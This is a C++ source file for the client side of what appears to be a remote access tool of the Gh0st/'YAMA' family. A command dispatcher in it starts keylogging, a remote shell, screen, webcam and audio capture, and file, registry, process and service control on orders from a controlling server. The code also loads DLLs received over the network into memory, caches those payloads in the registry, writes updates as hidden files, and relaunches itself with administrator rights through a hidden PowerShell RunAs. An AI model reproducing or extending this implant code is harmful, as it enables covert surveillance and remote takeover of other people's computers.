// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
#include <iostream>
#include <fstream>
#include <corecrt_io.h>
#include "ClientDll.h"
#include "MemoryModule.h"
#include "common/dllRunner.h"
#include "server/2015Remote/pwd_gen.h"
#include <common/iniFile.h>
#include "IOCPUDPClient.h"
#include "IOCPKCPClient.h"

// UDP 协议仅能针对小包数据，且数据没有时序关联
IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, bool exit_while_disconnect) {
	if (conn->protoType == PROTO_HTTPS) return NULL;

	int type = conn->protoType == PROTO_RANDOM ? time(nullptr) % PROTO_RANDOM : conn->protoType;
	if (!conn->IsVerified() || type == PROTO_TCP)
		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType());
	if (type == PROTO_UDP)
		return new IOCPUDPClient(bExit, exit_while_disconnect);
	if (type == PROTO_HTTP || type == PROTO_HTTPS)
		return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType());
	if (type == PROTO_KCP) {
		return new IOCPKCPClient(bExit, exit_while_disconnect);
	}

	return NULL;
}

ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
	static ThreadInfo tKeyboard;
	tKeyboard.run = FOREVER_RUN;
	tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn->GetHeaderEncType());
	tKeyboard.conn = conn;
	tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
	return &tKeyboard;
}

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s)
	: m_conn(conn), m_hInstance(hInstance), CManager(ClientObject), g_bExit(s)
{
	m_ulThreadCount = 0;
#ifdef _DEBUG
	m_settings = { 5 };
#else
	m_settings = { 0 };
#endif
	m_nNetPing = -1;
	m_hKeyboard = kb;
}

CKernelManager::~CKernelManager()
{
	Mprintf("~CKernelManager begin\n");
	int i = 0;
	for (i=0;i<MAX_THREADNUM;++i)
	{
		if (m_hThread[i].h!=0)
		{
			CloseHandle(m_hThread[i].h);
			m_hThread[i].h = NULL;
			m_hThread[i].run = FALSE;
			while (m_hThread[i].p)
				Sleep(50);
		}
	}
	m_ulThreadCount = 0;
	Mprintf("~CKernelManager end\n");
}

// 获取可用的线程下标
UINT CKernelManager::GetAvailableIndex() {
	if (m_ulThreadCount < MAX_THREADNUM) {
		return m_ulThreadCount;
	}

	for (int i = 0; i < MAX_THREADNUM; ++i)
	{
		if (m_hThread[i].p == NULL) {
			return i;
		}
	}
	return -1;
}

BOOL WriteBinaryToFile(const char* data, ULONGLONG size, const char* name = "ServerDll.new")
{
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p + 1, name);
	if (_access(path, 0) != -1)
	{
		if (std::string("ServerDll.new")!=name) return TRUE;
		DeleteFileA(path);
	}
	// 打开文件，以二进制模式写入
	std::string filePath = path;
	std::ofstream outFile(filePath, std::ios::binary);

	if (!outFile)
	{
		Mprintf("Failed to open or create the file: %s.\n", filePath.c_str());
		return FALSE;
	}

	// 写入二进制数据
	outFile.write(data, size);

	if (outFile.good())
	{
		Mprintf("Binary data written successfully to %s.\n", filePath.c_str());
	}
	else
	{
		Mprintf("Failed to write data to file.\n");
		outFile.close();
		return FALSE;
	}

	// 关闭文件
	outFile.close();
	// 设置文件属性为隐藏
	if (SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN))
	{
		Mprintf("File created and set to hidden: %s\n", filePath.c_str());
	}
	return TRUE;
}

typedef struct DllExecParam
{
	DllExecuteInfo info;
	PluginParam param;
	BYTE* buffer;
	DllExecParam(const DllExecuteInfo& dll, const PluginParam& arg, BYTE* data) : info(dll), param(arg) {
		buffer = new BYTE[info.Size];
		memcpy(buffer, data, info.Size);
	}
	~DllExecParam() {
		SAFE_DELETE_ARRAY(buffer);
	}
}DllExecParam;


class MemoryDllRunner : public DllRunner {
protected:
	HMEMORYMODULE m_mod;
public:
	MemoryDllRunner() : m_mod(nullptr) {}
	virtual void* LoadLibraryA(const char* data, int size) {
		return (m_mod = ::MemoryLoadLibrary(data, size));
	}
	virtual FARPROC GetProcAddress(void* mod, const char* lpProcName) {
		return ::MemoryGetProcAddress((HMEMORYMODULE)mod, lpProcName);
	}
	virtual BOOL FreeLibrary(void* mod) {
		::MemoryFreeLibrary((HMEMORYMODULE)mod);
		return TRUE;
	}
};


DWORD WINAPI ExecuteDLLProc(LPVOID param) {
	DllExecParam* dll = (DllExecParam*)param;
	DllExecuteInfo info = dll->info;
	PluginParam pThread = dll->param;
#ifdef _DEBUG
	WriteBinaryToFile((char*)dll->buffer, info.Size, info.Name);
	DllRunner* runner = new DefaultDllRunner(info.Name);
#else
	DllRunner* runner = new MemoryDllRunner();
#endif
	HMEMORYMODULE module = runner->LoadLibraryA((char*)dll->buffer, info.Size);
	if (module) {
		switch (info.CallType)
		{
		case CALLTYPE_DEFAULT:
			while (S_CLIENT_EXIT != *pThread.Exit)
				Sleep(1000);
			break;
		case CALLTYPE_IOCPTHREAD: {
			PTHREAD_START_ROUTINE proc = (PTHREAD_START_ROUTINE)runner->GetProcAddress(module, "run");
			Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
			if (proc) {
				proc(&pThread);
			}else {
				while (S_CLIENT_EXIT != *pThread.Exit)
					Sleep(1000);
			}
			break;
		}
		default:
			break;
		}
		runner->FreeLibrary(module);
	}
	else {
		Mprintf("MemoryLoadLibrary '%s' failed\n", info.Name);
	}
	SAFE_DELETE(dll);
	SAFE_DELETE(runner);
	return 0x20250529;
}

DWORD WINAPI SendKeyboardRecord(LPVOID lParam) {
	CManager* pMgr = (CManager*)lParam;
	if (pMgr) {
		pMgr->Reconnect();
		pMgr->Notify();
	}
	return 0xDead0001;
}

// 判断 PowerShell 版本是否 >= 3.0
bool IsPowerShellAvailable() {
	// 设置启动信息
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE; // 隐藏窗口

	// 创建匿名管道以捕获 PowerShell 输出
	SECURITY_ATTRIBUTES sa = { sizeof(sa) };
	sa.bInheritHandle = TRUE; // 管道句柄可继承

	HANDLE hReadPipe, hWritePipe;
	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
		Mprintf("CreatePipe failed. Error: %d\n", GetLastError());
		return false;
	}

	// 设置标准输出和错误输出到管道
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.dwFlags |= STARTF_USESTDHANDLES;

	// 构造 PowerShell 命令
	std::string command = "powershell -Command \"$PSVersionTable.PSVersion.Major\"";
	// 创建 PowerShell 进程
	if (!CreateProcess(
		nullptr,                      // 不指定模块名（使用命令行）
		(LPSTR)command.c_str(),       // 命令行参数
		nullptr,                      // 进程句柄不可继承
		nullptr,                      // 线程句柄不可继承
		TRUE,                         // 继承句柄
		CREATE_NO_WINDOW,             // 不显示窗口
		nullptr,                      // 使用父进程环境块
		nullptr,                      // 使用父进程工作目录
		&si,                          // 启动信息
		&pi                           // 进程信息
	)) {
		Mprintf("CreateProcess failed. Error: %d\n", GetLastError());
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		return false;
	}

	// 关闭管道的写端
	CloseHandle(hWritePipe);

	// 读取 PowerShell 输出
	std::string result;
	char buffer[128];
	DWORD bytesRead;
	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		result += buffer;
	}

	// 关闭管道的读端
	CloseHandle(hReadPipe);

	// 等待进程结束
	WaitForSingleObject(pi.hProcess, INFINITE);

	// 获取退出代码
	DWORD exitCode=0;
	if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
		Mprintf("GetExitCodeProcess failed. Error: %d\n", GetLastError());
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return false;
	}

	// 关闭进程和线程句柄
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	// 解析返回的版本号
	if (exitCode == 0) {
		try {
			int version = std::stoi(result);
			Mprintf("PowerShell version: %d\n", version);
			return version >= 3;
		}
		catch (...) {
			Mprintf("Failed to parse PowerShell version.\n");
			return false;
		}
	}
	else {
		Mprintf("PowerShell command failed with exit code: %d\n", exitCode);
		return false;
	}
}

/*
Windows 10/11: 👉 放心使用，可以直接运行
Windows 7: 如果 PowerShell 版本 >= 3.0，可以运行; 否则无法以管理员权限重启
*/
bool StartAdminLauncherAndExit(const char* exePath, bool admin = true) {
	// 获取当前进程 ID
	DWORD currentPID = GetCurrentProcessId();

	// 构造 PowerShell 命令，等待当前进程退出后以管理员权限启动
	std::string launcherCmd = "powershell -Command \"Start-Sleep -Seconds 1; " // 等待 1 秒，确保当前进程退出
		"while (Get-Process -Id " + std::to_string(currentPID) + " -ErrorAction SilentlyContinue) { Start-Sleep -Milliseconds 500 }; "
		"Start-Process -FilePath '" + std::string(exePath);
	launcherCmd += admin ? "' -Verb RunAs\"" : "' \""; // 以管理员权限启动目标进程

	// 启动隐藏的 cmd 进程
	STARTUPINFO si = { sizeof(si) };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;  // 隐藏窗口
	PROCESS_INFORMATION pi = {};
	Mprintf("Run: %s\n", launcherCmd.c_str());
	if (CreateProcessA(NULL, (LPSTR)launcherCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		Mprintf("CreateProcess to start launcher process [%d].\n", pi.dwProcessId);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return true;
	}

	Mprintf("Failed to start launcher process.\n");
	return false;
}

BOOL IsRunningAsAdmin()
{
	BOOL isAdmin = FALSE;
	PSID administratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0, &administratorsGroup))
	{
		if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin))
		{
			isAdmin = FALSE;
		}
		FreeSid(administratorsGroup);
	}

	return isAdmin;
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
	if ((m_ulThreadCount = GetAvailableIndex()) == -1 && !isExit) {
		return Mprintf("CKernelManager: The number of threads exceeds the limit.\n");
	}
	else if (!isExit) {
		m_hThread[m_ulThreadCount].p = nullptr;
		m_hThread[m_ulThreadCount].conn = m_conn;
	}

	switch (szBuffer[0])
	{
	case CMD_RUNASADMIN: {
		char curFile[_MAX_PATH] = {};
		GetModuleFileName(NULL, curFile, MAX_PATH);
		if (!IsRunningAsAdmin())
		{
			if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile)) {
				g_bExit = S_CLIENT_EXIT;
				// 强制退出当前进程，并稍后以管理员权限运行
				Mprintf("CKernelManager: [%s] Restart with administrator privileges.\n", curFile);
				Sleep(1000);
				TerminateProcess(GetCurrentProcess(), 0xABCDEF);
			}
			Mprintf("CKernelManager: [%s] Restart with administrator privileges FAILED.\n", curFile);
			break;
		}
		Mprintf("CKernelManager: [%s] Running with administrator privileges.\n", curFile);
		break;
	}
	case CMD_AUTHORIZATION: {
		HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
		hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
#ifndef _DEBUG
		if (hMutex == NULL) { // 没有互斥量，主程序可能未运行
			Mprintf("!!! [WARN] Master program is not running.\n");
		}
#endif
		CloseHandle(hMutex);

		char buf[100] = {}, *passCode = buf + 5;
		memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
		std::string masterHash(skCrypt(MASTER_HASH));
		const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
		if (passCode[0] == 0) {
			std::string devId = getDeviceID();
			memcpy(buf + 24, buf + 12, 8); // 消息签名
			memcpy(buf + 96, buf + 8, 4); // 时间戳
			memcpy(buf + 5, devId.c_str(), devId.length());		// 16字节
			memcpy(buf + 32, pwdHash, 64);						// 64字节
			m_ClientObject->Send2Server((char*)buf, sizeof(buf));
			Mprintf("Request for authorization update.\n");
		} else {
			unsigned short* days = (unsigned short*)(buf + 1);
			unsigned short* num = (unsigned short*)(buf + 3);
			config* cfg = ((pwdHash == masterHash) && IsDebug) ? new config : new iniFile;
			cfg->SetStr("settings", "Password", *days <= 0 ? "" : passCode);
			cfg->SetStr("settings", "HMAC", *days <= 0 ? "" : buf + 64);
			Mprintf("Update authorization: %s, HMAC: %s\n", passCode, buf+64);
			delete cfg;
			g_bExit = S_SERVER_EXIT;
		}
		break;
	}
	case CMD_EXECUTE_DLL: {
#ifdef _WIN64
		static std::map<std::string, std::vector<BYTE>> m_MemDLL;
		const int sz = 1 + sizeof(DllExecuteInfo);
		if (ulLength < sz)break;
		DllExecuteInfo* info = (DllExecuteInfo*)(szBuffer + 1);
		const char* md5 = info->Md5;
		auto find = m_MemDLL.find(md5);
		if (find == m_MemDLL.end() && ulLength == sz) {
			iniFile cfg(CLIENT_PATH);
			auto md5 = cfg.GetStr("settings", info->Name + std::string(".md5"));
			if (md5.empty() || md5 != info->Md5 || !m_conn->IsVerified()) {
				// 第一个命令没有包含DLL数据，需客户端检测本地是否已经有相关DLL，没有则向主控请求执行代码
				m_ClientObject->Send2Server((char*)szBuffer, ulLength);
				break;
			}
			Mprintf("Execute local DLL from registry: %s\n", md5.c_str());
			binFile bin(CLIENT_PATH);
			auto local = bin.GetStr("settings", info->Name + std::string(".bin"));
			const BYTE* bytes = reinterpret_cast<const BYTE*>(local.data());
			m_MemDLL[md5] = std::vector<BYTE>(bytes + sz, bytes + sz + info->Size);
			find = m_MemDLL.find(md5);
		}
		BYTE* data = find != m_MemDLL.end() ? find->second.data() : NULL;
		if (info->Size == ulLength - sz && info->RunType == MEMORYDLL) {
			if (md5[0]) {
				m_MemDLL[md5] = std::vector<BYTE>(szBuffer + sz, szBuffer + sz + info->Size);
				iniFile cfg(CLIENT_PATH);
				cfg.SetStr("settings", info->Name + std::string(".md5"), md5);
				binFile bin(CLIENT_PATH);
				std::string buffer(reinterpret_cast<const char*>(szBuffer), ulLength);
				bin.SetStr("settings", info->Name + std::string(".bin"), buffer);
				Mprintf("Save DLL to registry: %s\n", md5);
			}
			data = szBuffer + sz;
		}
		if (data) {
			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
			CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
			Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
		}
#endif
		break;
	}

	case COMMAND_PROXY: {
		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
		m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
		break;
	}
	
	case COMMAND_SHARE:
	case COMMAND_ASSIGN_MASTER:
		if (ulLength > 2) {
			switch (szBuffer[1]) {
			case SHARE_TYPE_YAMA_FOREVER: {
				auto v = StringToVector((char*)szBuffer + 2, ':', 3);
				if (v[0].empty() || v[1].empty())
					break;

				iniFile cfg(CLIENT_PATH);
				auto now = time(nullptr);
				auto valid_to = atoi(cfg.GetStr("settings", "valid_to").c_str());
				if (now <= valid_to) break; // Avoid assign again
				cfg.SetStr("settings", "master", v[0]);
				cfg.SetStr("settings", "port", v[1]);
				float days = atof(v[2].c_str());
				if (days > 0) {
					auto valid_to = time(0) + days*86400;
					// overflow after 2038-01-19
					cfg.SetStr("settings", "valid_to", std::to_string(valid_to));
				}
			}
			case SHARE_TYPE_YAMA: {
				auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
				if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
				break;
			}
			case SHARE_TYPE_HOLDINGHANDS:
				break;
			}
		}
		break;

	case CMD_HEARTBEAT_ACK:
		if (ulLength > 8) {
			uint64_t n = 0;
			memcpy(&n, szBuffer + 1, sizeof(uint64_t));
			auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
				std::chrono::system_clock::now()
				);
			m_nNetPing = int((system_ms.time_since_epoch().count() - n) / 2);
		}
		break;
	case CMD_MASTERSETTING:
		if (ulLength > sizeof(MasterSettings)) {
			memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
		}
		break;
	case COMMAND_KEYBOARD: //键盘记录
		{
			if (m_hKeyboard) {
				CloseHandle(__CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
			} else {
				m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
				m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			}
			break;
		}

	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount].user = m_hInstance; 
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;// 被控端退出
			m_ClientObject->Send2Server((char*)&bToken, 1);
			g_bExit = S_CLIENT_EXIT;
			Mprintf("======> Client exit \n");
			break;
		}

	case SERVER_EXIT:
		{
			// 主控端退出
			g_bExit = S_SERVER_EXIT;
			Mprintf("======> Server exit \n");
			break;
		}

	case COMMAND_SCREEN_SPY:
		{
			UserParam* user = new UserParam{ ulLength > 1 ? new BYTE[ulLength - 1] : nullptr, int(ulLength-1) };
			if (ulLength > 1) {
				memcpy(user->buffer, szBuffer + 1, ulLength - 1);
				if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
			}
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
		    m_hThread[m_ulThreadCount].user = user;
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_LIST_DRIVE :
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WEBCAM:
		{
			static bool hasCamera = WebCamIsExist();
			if (!hasCamera) break;
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_AUDIO:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
			break;
		}

	case COMMAND_UPDATE:{
		auto typ = m_conn->ClientType();
		if (typ == CLIENT_TYPE_DLL || typ == CLIENT_TYPE_MODULE) {
			ULONGLONG size = 0;
			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
				g_bExit = S_CLIENT_UPDATE;
			}
		}else if (typ == CLIENT_TYPE_SHELLCODE || typ == CLIENT_TYPE_MEMDLL) {
			char curFile[_MAX_PATH] = {};
			GetModuleFileName(NULL, curFile, MAX_PATH);
			if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
				g_bExit = S_CLIENT_UPDATE;
				// 强制退出当前进程，并重新启动；这会触发重新获取 Shell code 从而做到软件升级
				Mprintf("CKernelManager: [%s] Will be updated.\n", curFile);
				Sleep(1000);
				TerminateProcess(GetCurrentProcess(), 0xABCDEF);
			}
			Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
		} else {
			Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
		}
		break;
	}

	default:
		{
			Mprintf("!!! Unknown command: %d\n", unsigned(szBuffer[0]));
			break;
		}
	}
}
